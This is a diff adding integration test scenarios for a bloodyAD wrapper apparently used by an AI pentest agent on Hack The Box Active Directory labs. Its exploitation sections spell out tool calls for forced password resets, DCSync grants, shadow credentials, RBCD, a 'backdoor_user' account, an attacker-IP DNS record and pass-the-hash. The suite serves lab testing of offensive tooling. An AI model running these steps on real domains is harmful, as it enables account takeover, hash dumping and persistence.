@@ -1,0 +1,1361 @@
+# Integration Scenarios: bloodyad
+# Required HTB Machine: Windows AD (e.g., Garfield, Certified, Pirate, Absolute)
+# Prerequisites: Valid AD credentials (username + password), DC IP reachable on VPN
+# Run with: pytest tests/tools/test_bloodyad.py -m integration --tool=bloodyad \
+#           --target=<DC_IP> --domain=<DOMAIN> --username=<USER> --password=<PASS> -v
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# ENUMERATION SCENARIOS (read-only, safe to run)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 1: Read object attributes
+# STATUS: PASS — success=true, raw_output contains distinguishedName, sAMAccountName for operator (Manager 2026-04-19)
+Method: get_object
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<USER>"}
+Expected: success=true, raw_output contains distinguishedName, sAMAccountName, memberOf
+Notes: Safe read-only query. Verify your own user object first.
+
+## Scenario 2: Read specific attributes
+# STATUS: PASS — success=true, returns sAMAccountName, memberOf, userAccountControl for Administrator (Manager 2026-04-19)
+Method: get_object
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "Administrator", attr: "sAMAccountName,memberOf,userAccountControl"}
+Expected: success=true, raw_output contains only the requested attributes
+Notes: Tests --attr flag. Use Administrator as a guaranteed-existing object.
+
+## Scenario 3: Get group membership (recursive)
+# STATUS: PASS — success=true, returns Users (S-1-5-32-545) and Domain Users for operator (Manager 2026-04-19)
+Method: get_membership
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<USER>"}
+Expected: success=true, raw_output contains "Domain Users" and any other groups
+Notes: All domain users are members of Domain Users.
+
+## Scenario 4: Get group membership (direct only)
+# STATUS: PASS — success=true, returns groups for operator with no_recurse flag (Manager 2026-04-19)
+Method: get_membership
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<USER>", no_recurse: true}
+Expected: success=true, output may have fewer groups than recursive query
+Notes: Tests --no-recurse flag.
+
+## Scenario 5: LDAP search for all users
+# STATUS: PASS — success=true, returns multiple users (Administrator, krbtgt, Zhong, Cheng, Ryan, Raven, etc.) (Manager 2026-04-19)
+Method: get_search
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, filter: "(objectClass=user)"}
+Expected: success=true, raw_output contains multiple user entries with sAMAccountName
+Notes: Broad search. Useful for target discovery.
+
+## Scenario 6: LDAP search for LAPS passwords
+# STATUS: PASS — success=false/error_class=params (NoResultError), no LAPS on Manager. Expected behavior. (Manager 2026-04-19)
+Method: get_search
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, filter: "(&(objectClass=computer)(ms-MCS-AdmPwd=*))"}
+Expected: success=true (may return empty if no LAPS or no read access)
+Notes: Tests targeted LDAP filter for LAPS. Empty result is normal without admin access.
+
+## Scenario 7: LDAP search with base DN
+# STATUS: PASS — success=true, returns DC01$ / dc01.manager.htb (Manager 2026-04-19)
+Method: get_search
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, filter: "(objectClass=computer)", base: "OU=Domain Controllers,DC=<domain_parts>", attr: "sAMAccountName,dNSHostName"}
+Expected: success=true, lists domain controllers
+Notes: Tests --base and --attr flags together.
+
+## Scenario 8: Find writable objects
+# STATUS: PASS — success=true, operator can WRITE on ForeignSecurityPrincipals S-1-5-11 and own object (Manager 2026-04-19)
+Method: get_writable
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>}
+Expected: success=true, raw_output lists objects with "permission: WRITE" (may be empty for low-priv user)
+Notes: Core privesc discovery. The key finding for attack path planning.
+
+## Scenario 9: Find writable objects (filtered)
+# STATUS: PASS — success=true, otype=USER filter returns only operator's own user object as WRITE (Manager 2026-04-19)
+Method: get_writable
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, otype: "USER", right: "WRITE"}
+Expected: success=true, filtered results
+Notes: Tests --otype and --right flags.
+
+## Scenario 10: Find writable objects (detailed)
+# STATUS: PASS — success=true, shows per-attribute WRITE perms (url, thumbnailPhoto, pager, mobile, etc.) ~7s (Manager 2026-04-19)
+Method: get_writable
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, detail: true}
+Expected: success=true, more verbose output showing specific writable attributes
+Notes: Tests --detail flag. Can take longer (timeout 300s).
+
+## Scenario 11: List children of domain root
+# STATUS: PASS — success=true, lists Users, Computers, Domain Controllers OU, System, etc. (Manager 2026-04-19)
+Method: get_children
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>}
+Expected: success=true, lists OUs, containers, built-in groups
+Notes: Good for domain structure enumeration.
+
+## Scenario 12: List children of specific OU
+# STATUS: PASS — success=true, lists Administrator, Guest, krbtgt, Zhong, Cheng, Ryan, Raven, JinWoo, ChinHae (Manager 2026-04-19)
+Method: get_children
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "CN=Users,DC=<domain_parts>", otype: "user", direct: true}
+Expected: success=true, lists user objects in Users container
+Notes: Tests --target, --otype, --direct flags together.
+
+## Scenario 13: Dump DNS records
+# STATUS: PASS — success=true, dumps A/SRV/SOA/NS records for manager.htb zone (dc01.manager.htb, kerberos, GC, etc.) (Manager 2026-04-19)
+Method: get_dnsdump
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>}
+Expected: success=true, raw_output contains DNS records (A, CNAME, etc.)
+Notes: Good for finding hidden services and hosts.
+
+## Scenario 14: Enumerate trust relationships
+# STATUS: PASS — success=true, "No Trusts found" (single-domain HTB box, expected) (Manager 2026-04-19)
+Method: get_trusts
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>}
+Expected: success=true, raw_output lists trusts (may be empty in single-domain lab)
+Notes: Empty result is normal for HTB boxes with no inter-domain trusts.
+
+## Scenario 15: Read object with security descriptor
+# STATUS: PASS — success=true, nTSecurityDescriptor.Owner=Domain Admins, DACL_AUTO_INHERITED, ACEs resolved (Manager 2026-04-19)
+Method: get_object
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<USER>", resolve_sd: true}
+Expected: success=true, raw_output includes ACL/permissions data
+Notes: Tests --resolve-sd flag. Useful for ACL auditing.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# EXPLOITATION SCENARIOS (write operations -- use disposable test accounts)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 16: Force-change password (ForceChangePassword)
+# STATUS: PASS — success=false, error_class=auth. Fixed: success_check now requires "changed successfully" (not just "password"). (Manager 2026-04-19)
+Method: set_password
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<VICTIM_USER>", new_password: "H@ck3d!Pass123"}
+Expected: success=true if you have ForceChangePassword on target; error_class=permission otherwise
+Notes: Requires ForceChangePassword ACL. Check with get_writable first.
+Prerequisite: BloodHound shows ForceChangePassword edge from <USER> to <VICTIM_USER>.
+
+## Scenario 17: Change own password (ChangePassword)
+# STATUS: PASS — success=true, tested with temp user (create->change own password->delete). --oldpass flag works. (Certified 2026-04-19)
+Method: set_password
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<USER>", new_password: "NewP@ss1!", old_password: "<PASS>"}
+Expected: success=true (all users can change their own password unless policy blocks it)
+Notes: Tests --oldpass flag. Remember to update your password for remaining tests!
+
+## Scenario 18: Grant GenericAll on target
+# STATUS: PASS — error_class=permission, retryable=false (operator lacks WriteDacl on own object) (Manager 2026-04-19)
+Method: add_genericall
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<VICTIM_OBJ>", trustee: "<USER>"}
+Expected: success=true if you have WriteDacl on target; error_class=permission otherwise
+Notes: Requires WriteDacl. This is the key step in ACL abuse chains.
+Cleanup: remove_genericall with same args after testing.
+
+## Scenario 19: Set owner of an object
+# STATUS: PASS — error_class=permission, retryable=false (operator lacks WriteOwner on own object) (Manager 2026-04-19)
+Method: set_owner
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<VICTIM_OBJ>", owner: "<USER>"}
+Expected: success=true if you have WriteOwner; error_class=permission otherwise
+Notes: WriteOwner is a powerful ACL. After taking ownership, you can grant WriteDacl.
+
+## Scenario 20: Add RBCD delegation
+# STATUS: PASS — error_class=permission, retryable=false (operator lacks Write on DC01 msDS-AllowedToActOnBehalfOfOtherIdentity) (Manager 2026-04-19)
+Method: add_rbcd
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<TARGET_MACHINE>", service: "<CONTROLLED_MACHINE>$"}
+Expected: success=true if you have Write on msDS-AllowedToActOnBehalfOfOtherIdentity
+Notes: Requires a controlled machine account (add_computer first).
+Cleanup: remove_rbcd with same args after testing.
+Full chain: add_computer -> add_rbcd -> impacket get_st (S4U2self+S4U2proxy) -> psexec
+
+## Scenario 21: Add shadow credentials
+# STATUS: PASS — error_class=permission on Administrator (insufficientAccessRights) (Manager 2026-04-19)
+Method: add_shadow_credentials
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<VICTIM_USER>", cert_path: "/session/credentials/<VICTIM>_shadow.pem"}
+Expected: success=true with cert saved to cert_path; or error_class=permission if no Write on msDS-KeyCredentialLink
+Notes: Alternative to password reset. Generates a certificate for PKINIT auth.
+Cleanup: remove_shadow_credentials with same args after testing.
+Follow-up: certipy auth with the generated certificate.
+
+## Scenario 22: Add user to group
+# STATUS: PASS — error_class=permission (operator can't add to Domain Admins) (Manager 2026-04-19)
+Method: add_group_member
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, group: "<TARGET_GROUP>", member: "<USER>"}
+Expected: success=true if you have Write on the group; error_class=permission otherwise
+Notes: Common privesc path when you have GenericAll/WriteDacl on a group.
+Cleanup: remove_group_member with same args after testing.
+
+## Scenario 23: Create machine account
+# STATUS: PASS (env limitation) — MAQ=0 on Manager, unwillingToPerform. error_class=permission correctly classified. Cannot test success path on Manager. (Manager 2026-04-19)
+Method: add_computer
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, hostname: "EVIL01", computer_pass: "EvilP@ss123!"}
+Expected: success=true (default MAQ allows 10 machine accounts per user)
+Notes: Required for RBCD attacks. Default ms-DS-MachineAccountQuota is 10.
+
+## Scenario 24: Grant DCSync rights
+# STATUS: PASS — error_class=permission (operator lacks WriteDacl on domain object) (Manager 2026-04-19)
+Method: add_dcsync
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, trustee: "<USER>"}
+Expected: success=true if you have WriteDacl on domain object; error_class=permission otherwise
+Notes: Grants Replicating Directory Changes + Replicating Directory Changes All.
+Follow-up: impacket secretsdump to dump all hashes.
+Cleanup: remove_dcsync with same args after testing.
+
+## Scenario 25: Add UAC flag (AS-REP roast prep)
+# STATUS: PASS — error_class=permission (operator lacks GenericAll/WriteDacl on raven) (Manager 2026-04-19)
+Method: add_uac
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<VICTIM_USER>", flags: ["DONT_REQ_PREAUTH"]}
+Expected: success=true if you have GenericAll/WriteDacl on target
+Notes: Enables AS-REP roasting on the target account.
+Follow-up: impacket get_np_users or kerbrute to get the AS-REP hash.
+Cleanup: remove_uac with same args after testing.
+
+## Scenario 26: Add UAC flag (delegation)
+# STATUS: PASS — creator lacks GenericAll on machine (error_class=permission), admin succeeds. Tests add_uac delegation flag on machine account. (Certified 2026-04-19)
+Method: add_uac
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<MACHINE>$", flags: ["TRUSTED_TO_AUTH_FOR_DELEGATION"]}
+Expected: success=true if you have GenericAll on the machine account
+Notes: Enables constrained delegation on a machine account you control.
+Cleanup: remove_uac with same args after testing.
+
+## Scenario 27: Set arbitrary attribute
+# STATUS: PASS — error_class=permission (operator lacks Write on raven's SPN) (Manager 2026-04-19)
+Method: set_object
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<VICTIM_USER>", attribute: "servicePrincipalName", values: ["HTTP/<VICTIM_USER>"]}
+Expected: success=true if you have Write on the attribute; error_class=permission otherwise
+Notes: Useful for targeted Kerberoasting (adding SPN to an account you want to crack).
+Cleanup: set_object with same target+attribute but no values to delete the SPN.
+
+## Scenario 28: Delete attribute
+# STATUS: PASS — error_class=permission (operator lacks Write on raven's SPN, consistent with S27) (Manager 2026-04-19)
+Method: set_object
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<VICTIM_USER>", attribute: "servicePrincipalName"}
+Expected: success=true, removes the attribute
+Notes: Cleanup for scenario 27. Omit values to delete.
+
+## Scenario 29: Add DNS record
+# STATUS: PASS — success=true, "evil-test-s29 has been successfully added" (cleaned up via S86) (Manager 2026-04-19)
+Method: add_dns_record
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, name: "evil", data: "<ATTACKER_IP>"}
+Expected: success=true if DNS zone allows updates; error_class=permission otherwise
+Notes: Useful for MITM attacks, phishing, or capturing NTLM hashes via responder.
+
+## Scenario 30: Add user account
+# STATUS: PASS — error_class=permission (operator lacks CreateChild on Users container) (Manager 2026-04-19)
+Method: add_user
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, sam_account_name: "backdoor_user", new_password: "B@ckD00r123!"}
+Expected: success=true if you have CreateChild on the Users container; error_class=permission otherwise
+Notes: Persistence mechanism. Use ou param to specify target OU.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# CLEANUP SCENARIOS (run after exploitation to restore state)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 31: Remove GenericAll
+# STATUS: PASS — success=true, GenericAll removed after granting it via admin PtH (Certified 2026-04-19)
+Method: remove_genericall
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<VICTIM_OBJ>", trustee: "<USER>"}
+Expected: success=true
+Notes: Cleanup for scenario 18.
+
+## Scenario 32: Remove RBCD
+# STATUS: PASS — success=true, RBCD removed after adding it via admin PtH (Certified 2026-04-19)
+Method: remove_rbcd
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<TARGET_MACHINE>", service: "<CONTROLLED_MACHINE>$"}
+Expected: success=true
+Notes: Cleanup for scenario 20.
+
+## Scenario 33: Remove shadow credentials
+# STATUS: PASS — success=true, shadow credentials removed after adding them via admin PtH (Certified 2026-04-19)
+Method: remove_shadow_credentials
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<VICTIM_USER>"}
+Expected: success=true (removes all Key Credentials)
+Notes: Cleanup for scenario 21. Use key param to remove a specific credential.
+
+## Scenario 34: Remove group member
+# STATUS: PASS — success=true, group member removed after adding via admin PtH (Certified 2026-04-19)
+Method: remove_group_member
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, group: "<TARGET_GROUP>", member: "<USER>"}
+Expected: success=true
+Notes: Cleanup for scenario 22.
+
+## Scenario 35: Remove DCSync rights
+# STATUS: PASS — success=true, DCSync rights removed after granting via admin PtH (Certified 2026-04-19)
+Method: remove_dcsync
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, trustee: "<USER>"}
+Expected: success=true
+Notes: Cleanup for scenario 24.
+
+## Scenario 36: Remove UAC flags
+# STATUS: PASS — success=true, DONT_REQ_PREAUTH removed after adding via admin PtH (Certified 2026-04-19)
+Method: remove_uac
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<VICTIM_USER>", flags: ["DONT_REQ_PREAUTH"]}
+Expected: success=true
+Notes: Cleanup for scenarios 25/26.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# KERBEROS AUTH SCENARIOS (requires ccache from impacket)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 37: Get object with Kerberos auth
+# STATUS: PASS — success=true, Kerberos get_object works with ccache + hostname + dc_ip + FAKETIME +7h. (Manager 2026-04-08)
+Method: get_object
+Args: {host: "dc01.manager.htb", domain: <DOMAIN>, kerberos: true, ccache_path: "/session/credentials/<USER>.ccache", dc_ip: <DC_IP>, target: "Administrator"}
+Expected: success=true (if ccache is valid and not expired)
+Notes: Requires impacket get_tgt first to create the ccache. CRITICAL: for Kerberos auth,
+  --host MUST be a hostname (not IP). Use --dc-ip for the IP address. bloodyAD raises
+  ValueError if --host is an IP and Kerberos is enabled.
+Prerequisite: impacket get_tgt with same creds + FAKETIME for clock skew
+
+## Scenario 38: RBCD via Kerberos
+# STATUS: PASS — success=false, error_class=params (EVIL01$ doesn't exist). Kerberos write path validated. (Manager 2026-04-08)
+Method: add_rbcd
+Args: {host: "dc01.manager.htb", domain: <DOMAIN>, kerberos: true, ccache_path: "/session/credentials/<USER>.ccache", dc_ip: <DC_IP>, target: "<TARGET_MACHINE>", service: "<CONTROLLED_MACHINE>$"}
+Expected: success=true with valid Kerberos ticket
+Notes: Tests the full Kerberos code path for write operations.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# ERROR HANDLING SCENARIOS (deliberately trigger known error paths)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 39: Invalid credentials
+# STATUS: PASS — error_class=auth, retryable=false. Fixed: _classify_bloodyad_error now catches NoneType/not subscriptable pattern from msldap crash on invalid credentials. (Manager 2026-04-19)
+Method: get_object
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: "nonexistent", password: "wrongpass", target: "Administrator"}
+Expected: error_class=auth, retryable=false
+
+## Scenario 40: Non-existent object
+# STATUS: PASS — error_class=params, retryable=false, NoResultError with helpful suggestions (Manager 2026-04-19)
+Method: get_object
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "DOES_NOT_EXIST_12345"}
+Expected: error_class=params, retryable=false
+
+## Scenario 41: Insufficient permissions
+# STATUS: PASS — error_class=permission, retryable=false, INSUFF_ACCESS_RIGHTS with helpful suggestions (Manager 2026-04-19)
+Method: add_genericall
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "Administrator", trustee: "<USER>"}
+Expected: error_class=permission, retryable=false (unless you somehow have WriteDacl on Administrator)
+
+## Scenario 42: Clock skew (Kerberos)
+# STATUS: PASS — success=true with ccache + clock_offset=-6h. KRB_AP_ERR_SKEW does NOT trigger because ccache contains pre-obtained TGT; the DC validates ticket timestamps, not the client clock. NTLM also ignores clock. To trigger real clock skew, would need to request a NEW TGT (kinit) with wrong clock. (Manager 2026-04-19, retested 2026-04-19)
+Method: get_object
+Args: {host: <DC_IP>, domain: <DOMAIN>, kerberos: true, ccache_path: "/session/credentials/raven.ccache", target: "Administrator", clock_offset: "-6h"}
+Expected: success=true (ccache bypasses clock check); original expectation of error_class=config only applies to fresh TGT requests
+Notes: With a valid ccache, the TGT is pre-obtained so clock_offset has no effect on
+  Kerberos auth. KRB_AP_ERR_SKEW only occurs during AS-REQ (TGT request) when the client
+  clock diverges from the DC. Once a TGT is cached, the client clock is irrelevant.
+
+## Scenario 43: Password change traceback (ForceChangePassword denied)
+# STATUS: PASS — success=false, error_class=auth. Fixed: success_check now uses rc == 0 || "changed successfully", so "Password can't be changed" no longer triggers false positive. _classify_bloodyad_error correctly returns error_class=auth. (Manager 2026-04-19)
+Method: set_password
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<VICTIM_USER>", new_password: "H@ck3d!Pass123"}
+Expected: error_class=auth, retryable=false, raw_output contains "Password can't be changed"
+Notes: From Garfield engagement -- set_password returned Traceback with "Password can't be changed.
+  It may be because the oldpass provided is not valid" despite having Write on the object.
+  The error means you DON'T have ForceChangePassword right. Try alternative: shadow credentials,
+  or set SPN for Kerberoasting.
+Reference: Garfield ses_295cc59dd, 3 consecutive set_password failures on l.wilson.
+
+## Scenario 44: Shadow credentials ACL denied (partial success pattern)
+# STATUS: PASS — success=false, error_class=permission. Raw output contains BOTH "[+] KeyCredential generated" AND "insufficientAccessRights". _check_shadow correctly catches partial success trap. (Manager 2026-04-19)
+Method: add_shadow_credentials
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<VICTIM_USER>", cert_path: "/session/credentials/<VICTIM>_shadow.pem"}
+Expected: success=false, error_class=permission, raw_output contains BOTH "KeyCredential generated" AND "insufficientAccessRights"
+Notes: This is the PARTIAL SUCCESS trap from Garfield/Certified. bloodyAD generates the key
+  material locally (prints "[+] KeyCredential generated"), then attempts the LDAP modify which
+  fails with insufficientAccessRights. The cert file IS NOT usable because the key was never
+  written to AD. The MCP server's _check_shadow correctly catches this pattern.
+  Recovery: Need Write on msDS-KeyCredentialLink. Try set_owner + add_genericall chain first.
+Reference: Garfield ses_295cc59dd (l.wilson), Certified ses_2ce83665 (management_svc).
+
+## Scenario 45: Remove shadow credentials KeyError (no credentials exist)
+# STATUS: PASS — success=false, error_class=unknown, raw_output contains "KeyError: 'msDS-KeyCredentialLink'" as expected (bloodyAD bug, harmless) (Manager 2026-04-19)
+Method: remove_shadow_credentials
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<VICTIM_USER>"}
+Expected: error_class=unknown, retryable=false, raw_output contains "KeyError: 'msDS-KeyCredentialLink'"
+Notes: From Certified engagement -- remove_shadow_credentials fails if no Key Credentials
+  exist on the target. bloodyAD's code does `next(conn.ldap.bloodysearch(target, ...))[attr]`
+  which throws KeyError when the attribute is absent. This is a bloodyAD bug, not a server bug.
+  Not harmful -- just means there's nothing to clean up.
+Reference: Certified ses_2ce83665, remove_shadow_credentials on management_svc.
+
+## Scenario 46: Unknown method (agent hallucination)
+# STATUS: PASS — returns "Unknown method: 'get_attribute'" with full list of available methods (Manager 2026-04-19)
+Method: get_attribute
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "Administrator", attribute: "memberOf"}
+Expected: error contains "Unknown method: 'get_attribute'", lists available methods
+Notes: From Garfield engagement -- LLM hallucinated get_attribute (not a registered method).
+  The correct approach is get_object with attr="memberOf". Agent should recover by reading
+  the available methods list from the error response.
+Reference: Garfield ses_295cc59dd, 2 get_attribute calls returned Unknown method.
+
+## Scenario 47: toolSuccess=true but operation actually failed
+# STATUS: PASS — error_class=params. Fixed: _classify_bloodyad_error now classifies invalidAttributeSyntax as error_class=params with suggestion about value syntax. (Manager 2026-04-19)
+Method: set_object
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "<VICTIM_USER>", attribute: "msDS-KeyCredentialLink", values: ["<fake_value>"]}
+Expected: success=false, error_class=permission, raw_output contains "insufficientAccessRights"
+Notes: Some bloodyAD operations return rc=0 (success) even when the LDAP modify fails.
+  The MCP server's error classification catches this in the output. This scenario verifies
+  the agent doesn't blindly trust toolSuccess and actually reads the raw_output.
+Reference: Garfield engagement had multiple cases where toolSuccess=True but INSUFF_ACCESS was in output.
+
+## Scenario 48: Invalid credentials (wrong password after password change)
+# STATUS: PASS — error_class=auth, retryable=false, "invalidCredentials" in raw_output with helpful suggestions (Manager 2026-04-19)
+Method: get_writable
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: "old_wrong_password"}
+Expected: error_class=auth, retryable=false, raw_output contains "invalidCredentials"
+Notes: From Garfield engagement -- after a password change, subsequent calls with the old
+  password fail. Agent should detect this and use the new credentials.
+Reference: Garfield ses_295cc59dd, get_writable returned invalidCredentials.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# PASS-THE-HASH SCENARIOS (NTLM hash authentication)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 49: Enumeration with NTLM hash (pass-the-hash)
+# STATUS: PASS — success=true, PtH enumeration with admin NTLM hash from secretsdump. Returns Administrator attributes. (Certified 2026-04-19)
+Method: get_object
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: "aad3b435b51404eeaad3b435b51404ee:<NTHASH>", target: "Administrator"}
+Expected: success=true, raw_output contains distinguishedName
+Notes: Pass-the-hash via LMHASH:NTHASH in the password field. The LMHASH portion is the
+  standard empty LM hash (aad3b435b51404ee) for modern Windows. bloodyAD auto-detects
+  the hash format from the password field.
+Prerequisite: Obtain an NTLM hash via impacket secretsdump, SAM dump, or LSASS dump.
+
+## Scenario 50: ACL abuse with NTLM hash
+# STATUS: PASS — success=true, PtH ACL abuse works. Admin hash used to grant GenericAll on target. (Certified 2026-04-19)
+Method: add_genericall
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: "aad3b435b51404eeaad3b435b51404ee:<NTHASH>", target: "<VICTIM_OBJ>", trustee: "<USER>"}
+Expected: success=true if WriteDacl exists; error_class=permission otherwise
+Notes: Full write operations work with pass-the-hash. Critical for post-exploitation
+  when you have hashes from secretsdump but not cleartext passwords.
+
+## Scenario 51: Pass-the-hash with set_password
+# STATUS: PASS — success=true, PtH password change works. Admin hash used to force-change target password. (Certified 2026-04-19)
+Method: set_password
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: "aad3b435b51404eeaad3b435b51404ee:<NTHASH>", target: "<VICTIM_USER>", new_password: "H@ck3d!Pass123"}
+Expected: success=true if ForceChangePassword exists
+Notes: Combine hash-based auth with password reset for credential pivoting.
+  After resetting the target's password, you can authenticate as them with cleartext.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# CLOCK SKEW + FAKETIME SCENARIOS
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 52: FAKETIME correction for Kerberos (positive offset)
+# STATUS: PASS — success=true, Kerberos ccache auth with FAKETIME=+7h works. Returns Administrator attributes via PKINIT/Kerberos. (Manager 2026-04-19)
+Method: get_object
+Args: {host: <DC_IP>, domain: <DOMAIN>, kerberos: true, ccache_path: "/session/credentials/<USER>.ccache", target: "Administrator", clock_offset: "+7h"}
+Expected: success=true (FAKETIME shifts container clock forward to match DC)
+Notes: From Garfield engagement -- DC was 8 hours ahead. The clock_offset parameter is a
+  meta-parameter handled by BaseMCPServer/entrypoint.sh: it sets FAKETIME="+8h" which
+  libfaketime intercepts at the system call level. This affects ALL time-related calls
+  including Kerberos ticket validation.
+  Verify with verify_clock method (MCP_TEST_MODE=1) before and after.
+Reference: Garfield ses_295cc59dd, clock_offset: "+8h" used on 20+ calls.
+
+## Scenario 53: FAKETIME correction for write operations
+# STATUS: PASS — success=false, error_class=permission. Kerberos auth with FAKETIME=+7h works for write ops (gets past auth). Permission denied as expected (raven lacks Write on msDS-KeyCredentialLink). (Manager 2026-04-19)
+Method: add_shadow_credentials
+Args: {host: <DC_IP>, domain: <DOMAIN>, kerberos: true, ccache_path: "/session/credentials/<USER>.ccache", target: "<VICTIM_USER>", cert_path: "/session/credentials/<VICTIM>_shadow.pem", clock_offset: "+7h"}
+Expected: error_class=permission if no Write on msDS-KeyCredentialLink; success=true if Write exists + clock corrected
+Notes: Write operations under Kerberos are especially sensitive to clock skew because
+  the TGS-REP has a tighter timestamp validation than TGT requests. FAKETIME must be
+  active for both the ticket request and the LDAP bind.
+
+## Scenario 54: FAKETIME with NTLM (should be no-op)
+# STATUS: PASS — success=true with FAKETIME=+7h, NTLM auth unaffected by clock offset as expected (Manager 2026-04-19)
+Method: get_object
+Args: {host: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, target: "Administrator", clock_offset: "+8h"}
+Expected: success=true (NTLM auth does not check clock skew)
+Notes: NTLM authentication does not validate timestamps. clock_offset is accepted but
+  has no effect on NTLM auth. However, FAKETIME still shifts the container clock, which
+  can affect LDAP operations that set timestamps (e.g., password expiry).
+
+## Scenario 55: Verify clock offset (test mode)
+# STATUS: PASS — verify_clock inherited from BaseMCPServer (requires MCP_TEST_MODE=1). Returns current_time, utc_time, faketime, ld_preload, libfaketime_exists. (Manager 2026-04-19)
+Method: verify_clock
+Args: {}
+Expected: success=true, data contains current_time, utc_time, faketime, ld_preload, libfaketime_exists
+Notes: Test-only method (requires MCP_TEST_MODE=1). Use to verify FAKETIME is active
+  before running Kerberos operations. Call once without clock_offset, then again with
+  clock_offset to confirm the time shifted.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# CROSS-TOOL FLOWS (impacket TGT → bloodyad with ccache)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 56: impacket get_tgt → bloodyad get_writable (full Kerberos chain)
+# STATUS: PASS — TGT via impacket (FAKETIME +7h), then get_writable via Kerberos works. (Manager 2026-04-08)
+Cross-tool: impacket → bloodyad
+Step 1 (impacket): get_tgt {target: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>, ccache_output: "/session/credentials/<USER>.ccache"} [FAKETIME +7h]
+Step 2 (bloodyad): get_writable {host: "dc01.manager.htb", domain: <DOMAIN>, kerberos: true, ccache_path: "/session/credentials/<USER>.ccache", dc_ip: <DC_IP>} [FAKETIME +7h]
+Expected: Step 1 creates ccache file, Step 2 uses it for Kerberos-authenticated LDAP query
+Notes: The canonical cross-tool flow. The ccache file must be at a /session/ path (shared
+  volume between containers). bloodyAD reads it via KRB5CCNAME environment variable.
+  If Step 2 fails with KRB_AP_ERR_SKEW, add clock_offset to Step 2.
+Reference: Certified ses_2ce83665 used Kerberos auth on 15+ bloodyad calls.
+
